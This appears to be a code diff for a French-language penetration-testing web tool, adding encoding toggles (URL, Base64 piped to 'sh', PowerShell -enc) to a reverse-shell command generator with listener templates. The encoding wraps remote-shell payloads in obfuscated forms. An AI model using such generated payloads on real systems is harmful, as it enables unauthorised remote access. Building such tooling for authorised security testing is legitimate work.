@@ -1,8 +1,9 @@
 "use client";
 
-import { useCallback, useEffect, useMemo, useState } from "react";
+import { useCallback, useEffect, useMemo, useState, type ReactNode } from "react";
 import { PageHeader } from "@/components/PageHeader";
 import { useToast } from "@/components/Toast";
+import { Badge } from "@/components/ui";
 import { SHELLS, LISTENERS, fillTpl, type ShellTpl } from "@/lib/revshells";
 import { md5, sha } from "@/lib/hashing";
 
@@ -87,12 +88,73 @@ function CopyBlock({ label, value }: { label?: string; value: string }) {
   );
 }
 
+/* Toggle segmenté réutilisable (état actif = signal cyan). */
+function Toggle({
+  active,
+  onClick,
+  children,
+}: {
+  active: boolean;
+  onClick: () => void;
+  children: ReactNode;
+}) {
+  return (
+    <button
+      type="button"
+      onClick={onClick}
+      aria-pressed={active}
+      className={`focus-ring rounded-sm border px-2.5 py-1 font-mono text-label uppercase transition-colors duration-fast ease-out-soft ${
+        active
+          ? "border-secondary bg-secondary/10 text-secondary"
+          : "border-line-strong text-muted hover:text-ink"
+      }`}
+    >
+      {children}
+    </button>
+  );
+}
+
 /* ───────────── 1. Reverse shell ───────────── */
+
+type EncMode = "none" | "url" | "b64" | "psenc";
+const ENC_OPTIONS: { id: EncMode; label: string }[] = [
+  { id: "none", label: "Brut" },
+  { id: "url", label: "URL" },
+  { id: "b64", label: "Base64" },
+  { id: "psenc", label: "PS -enc" },
+];
+
+// Base64 d'une chaîne encodée en UTF-16LE (format attendu par `powershell -e`).
+function utf16leB64(s: string): string {
+  const bytes = new Uint8Array(s.length * 2);
+  for (let i = 0; i < s.length; i++) {
+    const c = s.charCodeAt(i);
+    bytes[i * 2] = c & 0xff;
+    bytes[i * 2 + 1] = (c >> 8) & 0xff;
+  }
+  let bin = "";
+  bytes.forEach((b) => (bin += String.fromCharCode(b)));
+  return btoa(bin);
+}
+
+function encodeRev(cmd: string, mode: EncMode): string {
+  switch (mode) {
+    case "none":
+      return cmd;
+    case "url":
+      return encodeURIComponent(cmd);
+    case "b64":
+      return `echo ${btoa(unescape(encodeURIComponent(cmd)))} | base64 -d | sh`;
+    case "psenc":
+      return `powershell -e ${utf16leB64(cmd)}`;
+  }
+}
 
 function RevShell() {
   const [ip, setIp] = useState("10.10.14.1");
   const [port, setPort] = useState("4444");
   const [os, setOs] = useState<ShellTpl["os"] | "All">("All");
+  const [enc, setEnc] = useState<EncMode>("none");
 
   const shells = useMemo(
     () => SHELLS.filter((s) => os === "All" || s.os === os),
@@ -103,39 +165,46 @@ function RevShell() {
     <div className="space-y-6">
       <div className="grid sm:grid-cols-2 gap-3 max-w-lg">
         <label className="block">
-          <span className="label !text-muted block mb-1.5">LHOST (ton IP)</span>
-          <input className="field" value={ip} onChange={(e) => setIp(e.target.value)} placeholder="10.10.14.1" />
+          <span className="label mb-2 block">LHOST (ton IP)</span>
+          <input className="field" value={ip} onChange={(e) => setIp(e.target.value)} placeholder="10.10.14.1" aria-label="LHOST" />
         </label>
         <label className="block">
-          <span className="label !text-muted block mb-1.5">LPORT</span>
-          <input className="field" value={port} onChange={(e) => setPort(e.target.value)} placeholder="4444" />
+          <span className="label mb-2 block">LPORT</span>
+          <input className="field" value={port} onChange={(e) => setPort(e.target.value)} placeholder="4444" aria-label="LPORT" />
         </label>
       </div>
 
-      <div className="flex flex-wrap gap-2">
-        {(["All", "Linux", "Windows", "Multi"] as const).map((o) => (
-          <button
-            key={o}
-            onClick={() => setOs(o)}
-            className={`px-2.5 py-1 font-mono text-xs uppercase tracking-[1px] border transition-colors ${
-              os === o ? "border-secondary text-secondary bg-secondary/10" : "border-line-strong text-muted hover:text-ink"
-            }`}
-          >
-            {o}
-          </button>
-        ))}
+      <div className="flex flex-col gap-4 sm:flex-row sm:flex-wrap sm:items-center sm:gap-x-8">
+        <div>
+          <span className="label mb-2 block">Système</span>
+          <div className="flex flex-wrap gap-2">
+            {(["All", "Linux", "Windows", "Multi"] as const).map((o) => (
+              <Toggle key={o} active={os === o} onClick={() => setOs(o)}>
+                {o}
+              </Toggle>
+            ))}
+          </div>
+        </div>
+        <div>
+          <span className="label mb-2 block">Encodage</span>
+          <div className="flex flex-wrap gap-2">
+            {ENC_OPTIONS.map((o) => (
+              <Toggle key={o.id} active={enc === o.id} onClick={() => setEnc(o.id)}>
+                {o.label}
+              </Toggle>
+            ))}
+          </div>
+        </div>
       </div>
 
       <div className="grid gap-3 lg:grid-cols-2">
         {shells.map((s) => (
-          <div key={s.name} className="card p-3">
+          <div key={s.name} className="rounded-md border border-line bg-surface p-3">
             <div className="flex items-center justify-between mb-2">
-              <span className="font-mono text-sm text-ink">{s.name}</span>
-              <span className="text-[10px] font-mono uppercase tracking-[1px] text-muted border border-line px-1.5 py-0.5">
-                {s.os}
-              </span>
+              <span className="font-mono text-body-sm text-ink">{s.name}</span>
+              <Badge>{s.os}</Badge>
             </div>
-            <CopyBlock value={fillTpl(s.parts, ip, port)} />
+            <CopyBlock value={encodeRev(fillTpl(s.parts, ip, port), enc)} />
           </div>
         ))}
       </div>
@@ -144,8 +213,8 @@ function RevShell() {
         <h2 className="label mb-3">Listeners</h2>
         <div className="grid gap-3 sm:grid-cols-2">
           {LISTENERS.map((l) => (
-            <div key={l.name} className="card p-3">
-              <div className="font-mono text-sm text-ink mb-2">{l.name}</div>
+            <div key={l.name} className="rounded-md border border-line bg-surface p-3">
+              <div className="font-mono text-body-sm text-ink mb-2">{l.name}</div>
               <CopyBlock value={fillTpl(l.parts, ip, port)} />
             </div>
           ))}
